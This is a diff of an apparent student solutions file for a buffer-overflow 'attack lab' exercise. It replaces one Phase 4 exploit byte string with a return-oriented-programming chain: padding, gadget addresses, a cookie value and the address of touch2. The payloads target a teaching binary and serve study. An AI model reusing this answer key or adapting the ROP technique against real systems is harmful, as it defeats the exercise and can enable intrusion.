@@ -43,27 +43,20 @@ a0 16 40 00 00 00 00 00
 
 ## Phase 4 Solution
 ```
-// injected code with total 40 bytes
-48 c7 c7 50 17 68 55 c3
+// fill with 40 bytes
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-// address of register and touch3
-18 22 65 55 00 00 00 00
-a0 16 40 00 00 00 00 00
+00 00 00 00 00 00 00 00
+// first gadget - popq %rax
+1d 18 40 00 00 00 00 00
 // cookie
-33 37 33 63 32 35 31 66
+1f 25 3c 37 00 00 00 00
+// second gadget - mov %rax to %rdi
+0c 18 40 00 00 00 00 00
+// address of touch2
+a0 16 40 00 00 00 00 00
 ```
-/* fill the buffer for the first 40 bytes */
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
-/* end of buffer */
-d5 18 40 00 00 00 00 00 /* gadget 1: popq %rax */
-6b 79 4f 5a 00 00 00 00 /* value of the cookie */
-e7 18 40 00 00 00 00 00 /* gadget 2: move %rax to %rdi */
-68 17 40 00 00 00 00 00 /* address of touch2() */
+
 ## Phase 5 Solution
